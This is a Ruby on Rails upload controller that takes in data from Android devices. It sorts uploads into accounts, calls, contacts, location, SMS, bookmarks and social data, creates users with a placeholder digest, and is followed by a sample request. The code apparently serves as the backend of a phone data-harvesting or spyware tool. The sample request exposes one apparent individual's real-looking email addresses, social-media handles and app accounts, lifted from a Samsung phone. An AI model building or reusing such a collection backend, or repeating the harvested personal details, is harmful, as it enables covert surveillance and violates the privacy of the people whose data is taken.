class UploadController < ApplicationController

	def index

    return head :bad_request unless params[:device] && params[:email] && params[:type] && params[:data]

    user = User.find(:email => params[:email])
    user ||= User.create!(:email => params[:email], :digest => "digest")

    device = Device.find(:number => params[:device])
    device ||= Device.create!(:number => params[:device], :user_id => user.id, :finger => params[:finger])

    transport

    head :ok
  end

  def transport
    data = JSON.parse(params[:data])

    case params[:type]
    
    when "accounts"
      Account.store(data)
    when "calls"
      #Call.store(data)
    when "contacts"
      #Contact.store(data)
    when "location"
      #Location.store(data)
    when "bookmarks"
      #Bookmark.store(data)
    when "sms"
      #SMS.store(data)
    when "social"
      #Social.store(data)
    when "profile"
      #Profile.store(data)
    end

  end

end



{ 
  "device"=>"b6a44655f91ba54",
  "email"=>"",
  "finger"=>"samsung/ja3gub/ja3g:4.4.2/KOT49H/I9500UBUFNC1:user/release-keys",
  "type"=>"accounts",
  "data"=>"[{\"id\":\"826961576\",\"name\":\"maxiperezc@gmail.com\",\"type\":\"com.osp.app.signin\"},
  {\"id\":\"-664652368\",\"name\":\"maxiperezc@gmail.com\",\"type\":\"com.google\"},
  {\"id\":\"-668119760\",\"name\":\"perezcotomagali.mpc@gmail.com\",\"type\":\"com.google\"},
  {\"id\":\"930907941\",\"name\":\"maxiperezc\",\"type\":\"com.twitter.android.auth.login\"},
  {\"id\":\"-1281866288\",\"name\":\"magaperezcoto\",\"type\":\"com.twitter.android.auth.login\"},
  {\"id\":\"303994846\",\"name\":\"WhatsApp\",\"type\":\"com.whatsapp\"},
  {\"id\":\"1544288047\",\"name\":\"1376571542\",\"type\":\"com.sec.android.app.sns3.facebook\"},
  {\"id\":\"-1530214698\",\"name\":\"maggali.f@hotmail.com\",\"type\":\"com.facebook.auth.login\"},
  {\"id\":\"254218185\",\"name\":\"BBM Groups\",\"type\":\"com.bbm.account\"},
  {\"id\":\"-1767685378\",\"name\":\"Sync\",\"type\":\"com.shazam.android\"},
  {\"id\":\"1122903757\",\"name\":\"Magaperezcoto 13\",\"type\":\"com.soundcloud.android.account\"},
  {\"id\":\"2059165179\",\"name\":\"magaliperezcoto@hotmail.com\",\"type\":\"com.dropbox.android.account\"},
  {\"id\":\"-1745526085\",\"name\":\"magaliperezcoto@hotmail.com\",\"type\":\"com.android.exchange\"},
  {\"id\":\"58090789\",\"name\":\"maggali.f@hotmail.com\",\"type\":\"com.etermax.games.account\"}]", 
  "action"=>"index", 
  "controller"=>"upload"
}
